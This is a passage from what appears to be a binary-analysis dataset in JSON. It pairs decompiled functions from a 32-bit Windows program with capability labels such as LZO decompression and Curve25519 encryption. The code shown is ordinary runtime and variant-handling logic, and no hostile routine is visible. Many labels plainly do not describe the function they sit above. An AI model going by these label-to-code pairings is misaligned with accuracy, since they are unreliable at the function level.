fcn.004099ac(arg_8h);\n    cVar1 = (**(*in_EAX + 0x84))();\n    if (cVar1 == '\\0') {\n        fcn.00408a18();\n        fcn.0040461c();\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.004045c8(0x46dc71);\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 437
    },
    "0040aba8": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040aba8(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char **ppcVar2;\n    uint var_4h;\n    \n    ppcVar2 = arg_8h + -4;\n    pcVar1 = *ppcVar2;\n    while (**ppcVar2 == *(arg_8h + -5)) {\n        *ppcVar2 = *ppcVar2 + 1;\n    }\n    *(arg_8h + -0xc) = *ppcVar2 + (1 - pcVar1);\n    return;\n}\n",
        "token_count": 133
    },
    "004201b8": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004201b8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.00422d60();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00422d34();\n            if ((*(iVar2 + 0x24) & 4) != 0) {\n                iVar2 = fcn.0040583c();\n                fcn.00405a18(iVar2 + 1);\n                uVar3 = fcn.00422d34();\n                iVar2 = fcn.0040583c();\n                *(*(arg_8h + -4) + -4 + iVar2 * 4) = uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 207
    },
    "00421a68": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421a68(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.0041fc54();\n        if (cVar1 != '\\0') break;\n        fcn.00421b1c();\n    }\n    fcn.00420bbc();\n    return;\n}\n",
        "token_count": 80
    },
    "00421ac0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421ac0(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.0041fc54();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.0041ff94();\n        if (cVar1 - 2U < 3) {\n            fcn.00421b1c();\n        }\n        fcn.00421f14();\n        while( true ) {\n            cVar1 = fcn.0041fc54();\n            if (cVar1 != '\\0') break;\n            fcn.00421cb8();\n        }\n        fcn.00420bbc();\n    }\n    fcn.00420bbc();\n    return;\n}\n",
        "token_count": 169
    },
    "0043f638": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043f638(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0041b058();\n    fcn.0043d360();\n    iVar1 = *(*(arg_8h + -8) + 8);\n    fcn.0041b0a8(&var_20h, \n                 ((*(iVar1 + 0x50) - *(iVar1 + 0x48)) + *(*(*(arg_8h + -4) + 0x30) + 0x4c)) - *(*(arg_8h + -4) + 0x4c));\n    fcn.0043d208();\n    return;\n}\n",
        "token_count": 185
    },
    "0044fe00": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044fe00(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t unaff_EBX;\n    \n    iVar1 = fcn.0040d5a0();\n    if (iVar1 != 0) {\n        fcn.00404b28();\n    }\n    return unaff_EBX & 0xffffff00 | iVar1 != 0;\n}\n",
        "token_count": 91
    },
    "004551a4": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004551a4(uint param_1, int32_t param_2)\n\n{\n    fcn.00440ed0();\n    *(param_2 + 0x24) = *(param_2 + 0x24) & 0xfffffffc;\n    return;\n}\n",
        "token_count": 65
    },
    "00466500": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.00466500(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint var_8h_2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    int32_t iStack36;\n    int32_t *var_1ch_2;\n    uchar *var_18h;\n    int32_t var_14h;\n    uchar *var_10h;\n    int32_t var_ch_2;\n    uint var_8h_3;\n    \n    iVar8 = 0;\n    iVar5 = (param_1 + 1) * -4;\n    var_10h = &stack0xffffffd0 + iVar5;\n    puVar2 = &stack0xffffffd0 + iVar5;\n    iStack36 = param_2;\n    var_1ch_2 = in_EAX;\n    var_ch_2 = param_1;\n    do {\n        puVar6 = puVar2;\n        *(puVar6 + -4) = 0x466534;\n        iVar3 = fcn.0040928c();\n        *(puVar6 + -4) = 0;\n        *(puVar6 + -8) = 0;\n        *(puVar6 + -0xc) = iVar3;\n        *(puVar6 + -0x10) = iStack36;\n        *(puVar6 + -0x14) = 0;\n        *(puVar6 + -0x18) = 0;\n        *(puVar6 + -0x1c) = 0x466547;\n        var_14h = sub.kernel32.dll_MultiByteToWideChar_1();\n        var_14h = var_14h + 1;\n        iVar5 = -(var_14h * 2 + 3U & 0xfffffffc);\n        var_18h = puVar6 + iVar5 + -0x18;\n        if (iVar8 == 0) {\n            *var_10h = puVar6 + iVar5 + -0x18;\n        }\n        else {\n            *(var_10h + (var_ch_2 - iVar8) * 4) = puVar6 + iVar5 + -0x18;\n            var_18h = puVar6 + iVar5 + -0x18;\n        }\n        *(puVar6 + iVar5 + -0x1c) = var_14h;\n        *(puVar6 + iVar5 + -0x20) = var_18h;\n        *(puVar6 + iVar5 + -0x24) = iVar3;\n        *(puVar6 + iVar5 + -0x28) = iStack36;\n        *(puVar6 + iVar5 + -0x2c) = 0;\n        *(puVar6 + iVar5 + -0x30) = 0;\n        *(puVar6 + iVar5 + -0x34) = 0x46658e;\n        sub.kernel32.dll_MultiByteToWideChar_1();\n        *(var_18h + var_14h * 2 + -2) = 0;\n        iStack36 = iStack36 + iVar3 + 1;\n        iVar8 = iVar8 + 1;\n        puVar2 = puVar6 + iVar5 + -0x30;\n    } while (iVar8 != var_ch_2);\n    *(puVar6 + iVar5 + -0x34) = var_8h_2;\n    *(puVar6 + iVar5 + -0x38) = 0x4665ad;\n    uVar4 = sub.kernel32.dll_GetThreadLocale_1();\n    *(puVar6 + iVar5 + -0x38) = uVar4;\n    *(puVar6 + iVar5 + -0x3c) = var_ch_2;\n    *(puVar6 + iVar5 + -0x40) = var_10h;\n    *(puVar6 + iVar5 + -0x44) = *0x484328;\n    *(puVar6 + iVar5 + -0x48) = var_1ch_2;\n    pcVar1 = *(*var_1ch_2 + 0x14);\n    puVar7 = puVar6 + iVar5 + -0x4c;\n    *(puVar6 + iVar5 + -0x4c) = 0x4665c5;\n    iVar5 = (*pcVar1)();\n    if (iVar5 == -0x7ffdfffa) {\n        *(puVar7 + -4) = &stack0xfffffffc;\n        *(puVar7 + -8) = 0x4665d2;\n        fcn.004664cc(*(puVar7 + -4));\n    }\n    else {\n        *(puVar7 + -4) = 0x4665da;\n        fcn.00465b2c();\n    }\n    return;\n}\n",
        "token_count": 1162
    },
    "0047511c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047511c(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x4751e3;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    (**(**(arg_8h + -4) + 0x44))();\n    do {\n        do {\n            iVar3 = fcn.00404888();\n            if (iVar3 < 1) {\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x4751ea;\n                uStack36 = 0x4751e2;\n                fcn.004045ec();\n                return;\n            }\n            fcn.0046bca8();\n            iVar3 = fcn.004754e0();\n        } while (iVar3 + -1 < 0);\n        do {\n            fcn.0046d190();\n            iVar2 = fcn.00408ab8();\n            if (iVar2 == 0) {\n                iVar3 = fcn.0046d190();\n                uVar1 = *(iVar3 + 0x94) | *0x4751f4;\n                iVar3 = fcn.0046d190();\n                *(iVar3 + 0x94) = uVar1;\n                break;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    } while( true );\n}\n",
        "token_count": 392
    },
    "0040eccc": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eccc(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40ed26;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00404850();\n        fcn.00408db8();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40ed2d;\n    uStack20 = 0x40ed25;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 195
    },
    "0040ed38": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ed38(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40ed92;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00404850();\n        fcn.0040a5c4();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40ed99;\n    uStack20 = 0x40ed91;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 196
    },
    "0040eda4": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eda4(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40edfe;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00404850();\n        fcn.0040a598();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40ee05;\n    uStack20 = 0x40edfd;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 194
    },
    "0040ee10": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ee10(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40ee6a;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00404850();\n        fcn.0040c008();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40ee71;\n    uStack20 = 0x40ee69;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 195
    },
    "0040ee7c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ee7c(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40eed6;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00404850();\n        fcn.0040a5f0();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40eedd;\n    uStack20 = 0x40eed5;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 197
    },
    "00410f74": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00410f74(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack28 = 0x411017;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.0041418c();\n    uVar3 = 0;\n    iVar2 = (***0x4847f8)(0, 0x400, 0, &var_4h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.00404850();\n        cVar1 = fcn.00408db8();\n        if (cVar1 == '\\0') {\n            var_4h = fcn.004121cc();\n            var_4h = var_4h & 0x7f;\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.0041011c();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.004045c8(0x41101e);\n    fcn.00404cd4();\n    return;\n}\n",
        "token_count": 318
    },
    "0041196c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint64_t fcn.0041196c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint uStack44;\n    uint uStack40;\n    int32_t iStack36;\n    uchar *puStack32;\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    iStack36 = 0x41197c;\n    sub.oleaut32.dll_VariantInit();\n    iStack36 = 3;\n    uStack40 = 0;\n    uStack44 = 0x400;\n    iVar1 = (***0x484728)(&stack0xffffffe8);\n    if (iVar1 == 0) {\n        uVar3 = iStack36;\n    }\n    else {\n        iVar1 = (***0x484728)(&stack0xffffffd4);\n        if (iVar1 == 0) {\n            uVar3 = fcn.00402f64();\n        }\n        else if (iVar1 == -0x7ffdfffb) {\n            uVar2 = fcn.004121cc();\n            uVar3 = uVar2 & 0x7f;\n        }\n        else {\n            fcn.0041011c();\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 302
    },
    "00411a18": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00411a18(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack44 = 0x411b06;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.0041418c();\n    fcn.00404850();\n    cVar1 = fcn.00408dd8();\n    if (cVar1 == '\\0') {\n        iVar2 = (***0x4847f8)(var_ch, 0x400, 0, &fcn.00411a18::var_10h);\n        if (iVar2 == 0) {\n            _var_8h = var_10h;\n        }\n        else {\n            iVar2 = (***0x4845fc)(var_ch, 0x400, 0, &fcn.00411a18::var_18h);\n            if (iVar2 == 0) {\n                _var_8h = fcn.00402f64();\n            }\n            else if (iVar2 == -0x7ffdfffb) {\n                uVar3 = fcn.004121cc();\n                _var_8h = uVar3 & 0x7f;\n            }\n            else {\n                fcn.0041011c();\n                _var_8h = 0;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x411b0d;\n    uStack44 = 0x411afd;\n    fcn.004045c8();\n    uStack44 = 0x411b05;\n    fcn.00404cd4();\n    return;\n}\n",
        "token_count": 476
    },
    "00415164": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint fcn.00415164(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    float10 fVar4;\n    ulong uVar5;\n    ulong uVar6;\n    \n    uVar2 = fcn.00414e38();\n    uVar1 = *((uVar2 & 0xffff) + 0x483460);\n    uVar2 = fcn.00414e38();\n    // switch table (11 cases) at 0x4151b5\n    switch(*(uVar1 * 0xb + 0x48349c + *((uVar2 & 0xffff) + 0x483460))) {\n    case 0:\n        fcn.0040fd24();\n        uVar3 = 1;\n        break;\n    case 1:\n        uVar3 = fcn.00414f30();\n        break;\n    case 2:\n        uVar3 = fcn.00414f44();\n        break;\n    case 3:\n        fcn.0041110c();\n        fcn.0041110c();\n        uVar3 = fcn.0041502c();\n        break;\n    case 4:\n        fVar4 = fcn.004126e0();\n        fVar4 = fcn.004126e0(fVar4);\n        uVar3 = fcn.0041507c(fVar4);\n        break;\n    case 5:\n        fVar4 = fcn.004133b8();\n        fVar4 = fcn.004133b8(ROUND(fVar4));\n        uVar3 = fcn.004150cc(ROUND(fVar4));\n        break;\n    case 6:\n        uVar3 = fcn.004150f8();\n        break;\n    case 7:\n        fcn.004121cc();\n        fcn.004121cc();\n        uVar3 = fcn.0041502c();\n        break;\n    case 8:\n        fVar4 = fcn.00412e50();\n        fVar4 = fcn.00412e50(fVar4);\n        uVar3 = fcn.004150a4(fVar4);\n        break;\n    case 9:\n        uVar5 = fcn.00411bd0();\n        uVar6 = fcn.00411bd0();\n        uVar3 = fcn.00415040(uVar6, uVar6 >> 0x20, uVar5, uVar5 >> 0x20);\n        break;\n    case 10:\n        uVar3 = fcn.00414e5c();\n        break;\n    default:\n        fcn.0040fd24();\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 600
    },
    "00418f6c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418f6c(float arg_8h, float arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    uint8_t *puVar2;\n    int32_t in_EDX;\n    double *pdVar3;\n    code *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = *(in_EDX + 8);\n    puVar2 = fcn.00418374();\n    uVar1 = *puVar2;\n    if ((var_ch & 0xff000000) == 0xff000000) {\n        pdVar3 = (var_ch & 0xffffff) + in_EAX;\n    // switch table (5 cases) at 0x418fb9\n        switch(uVar1 & 0x7f) {\n        case 0:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 1:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 2:\n            *pdVar3 = arg_8h;\n            *(pdVar3 + 4) = arg_ch;\n            *(pdVar3 + 1) = arg_10h;\n            break;\n        case 3:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n            break;\n        case 4:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x419174);\n        }\n    }\n    else {\n        if ((var_ch & 0xff000000) == 0xfe000000) {\n            var_ch = *(*in_EAX + var_ch);\n        }\n        if (*(in_EDX + 0x10) == -0x80000000) {\n    // switch table (5 cases) at 0x419064\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_ch)();\n                break;\n            case 1:\n                (*var_ch)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_ch)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_ch)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_ch)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x419174));\n            }\n        }\n        else {\n    // switch table (5 cases) at 0x4190f7\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_ch)();\n                break;\n            case 1:\n                (*var_ch)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_ch)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_ch)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_ch)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x419174));\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 784
    },
    "0041ca44": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041ca44(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    int32_t iStack16;\n    \n    iVar1 = *(in_EAX + 4) + 0x1f;\n    if (iVar1 < 0) {\n        iVar1 = *(in_EAX + 4) + 0x3e;\n    }\n    iStack16 = param_1;\n    if (-1 < (iVar1 >> 5) + -1) {\n        iVar3 = 0;\n        iStack16 = iVar1 >> 5;\n        do {\n            if (*0x41cab8 != *(*(in_EAX + 8) + iVar3 * 4)) {\n                uVar2 = 0;\n                do {\n                    bVar4 = uVar2 < 0x1f;\n                    if (uVar2 < 0x20) {\n                        bVar4 = (*(*(in_EAX + 8) + iVar3 * 4) >> (uVar2 & 0x1f) & 1) != 0;\n                    }\n                    if (!bVar4) {\n                        iVar1 = iVar3 * 0x20 + (uVar2 & 0x7f);\n                        if (*(in_EAX + 4) <= iVar1) {\n                            iVar1 = *(in_EAX + 4);\n                        }\n                        goto code_r0x0041cab0;\n                    }\n                    uVar2 = uVar2 + 1;\n                } while (uVar2 != ' ');\n            }\n            iVar3 = iVar3 + 1;\n            iStack16 = iStack16 + -1;\n        } while (iStack16 != 0);\n    }\n    iVar1 = *(in_EAX + 4);\ncode_r0x0041cab0:\n    return CONCAT44(iStack16, iVar1);\n}\n",
        "token_count": 434
    },
    "0041eddc": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0041eddc(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00409088(arg_8h, arg_ch);\n    return uVar1;\n}\n",
        "token_count": 69
    },
    "00420a04": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420a04(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00421a0c(param_1);\n    // switch table (6 cases) at 0x420a39\n    switch(uVar1 & 0x7f) {\n    case 0:\n        fcn.0040461c();\n        break;\n    default:\n        fcn.0041fa94();\n        break;\n    case 7:\n        fcn.0041ffb8();\n        fcn.004046b8();\n        fcn.00404ae0();\n        fcn.0041ffb8();\n        break;\n    case 8:\n        fcn.0040461c();\n        break;\n    case 9:\n        fcn.0040461c();\n        break;\n    case 0xd:\n        fcn.0040461c();\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "00421b1c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00421b1c(void)\n\n{\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack20 = 0x421cab;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.00421a0c();\n    // switch table (21 cases) at 0x421b53\n    switch(uVar1 & 0x7f) {\n    case 1:\n        fcn.00421a68(&stack0xfffffffc);\n        break;\n    case 2:\n        fcn.00421f14();\n        break;\n    case 3:\n        fcn.00421f14();\n        break;\n    case 4:\n        fcn.00421f14();\n        break;\n    case 5:\n        fcn.00421f14();\n        break;\n    case 6:\n    case 7:\n        fcn.00421830();\n        break;\n    case 10:\n        fcn.00421a90(&stack0xfffffffc);\n        break;\n    case 0xb:\n        fcn.00421a20();\n        break;\n    case 0xc:\n        fcn.00421a90(&stack0xfffffffc);\n        break;\n    case 0xe:\n        fcn.00421ac0(&stack0xfffffffc);\n        break;\n    case 0xf:\n        fcn.00421f14();\n        break;\n    case 0x10:\n        fcn.00421f14();\n        break;\n    case 0x11:\n        fcn.00421f14();\n        break;\n    case 0x12:\n        fcn.00421a90(&stack0xfffffffc);\n        break;\n    case 0x13:\n        fcn.00421f14();\n        break;\n    case 0x14:\n        fcn.00421a90(&stack0xfffffffc);\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x421cb2;\n    uStack20 = 0x421caa;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 524
    },
    "00422124": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00422124(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint in_stack_ffffffc8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x42231e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.004104c0();\n    uVar2 = fcn.0041ff94();\n    // switch table (21 cases) at 0x422166\n    switch(uVar2 & 0x7f) {\n    case 0:\n    case 0xd:\n        cVar1 = fcn.00421a0c();\n        if (cVar1 != '\\r') {\n            fcn.004177f4();\n        }\n        break;\n    default:\n        fcn.0040c998();\n        fcn.00403fc0();\n        break;\n    case 2:\n        fcn.00420b04();\n        fcn.004148d0();\n        break;\n    case 3:\n        fcn.00420b04();\n        fcn.004148d0();\n        break;\n    case 4:\n        fcn.00420b04();\n        fcn.004148d0();\n        break;\n    case 5:\n        fcn.004208e8();\n        fcn.00414ac8();\n        break;\n    case 6:\n    case 0xc:\n        fcn.0042186c();\n        fcn.00414b04();\n        break;\n    case 8:\n    case 9:\n        fcn.00421a0c();\n        fcn.00414aa0();\n        break;\n    case 10:\n        in_stack_ffffffc8 = 0x4222c1;\n        fcn.00421f5c(&stack0xfffffffc);\n        fcn.004107fc();\n        break;\n    case 0xf:\n        fcn.0042092c();\n        fcn.00414ac8();\n        break;\n    case 0x10:\n        fcn.00420970();\n        fcn.00414af0();\n        break;\n    case 0x11:\n        fcn.004209c0();\n        fcn.00414adc();\n        break;\n    case 0x12:\n    case 0x14:\n        fcn.00421928();\n        fcn.00414b80();\n        break;\n    case 0x13:\n        uVar3 = fcn.00420b70();\n        in_stack_ffffffc8 = uVar3;\n        fcn.004149cc(in_stack_ffffffc8, uVar3 >> 0x20);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    uStack48 = 0x422325;\n    fcn.004104d4();\n    fcn.00404cd4();\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 705
    },
    "00430538": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00430538(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    do {\n        iVar1 = *(in_EAX + 8 + (uVar2 & 0x7f) * 4);\n        if (iVar1 != 0) {\n            (***0x484590)(iVar1);\n            *(in_EAX + 8 + (uVar2 & 0x7f) * 4) = 0;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 != '\\x18');\n    return;\n}\n",
        "token_count": 152
    },
    "004306d8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
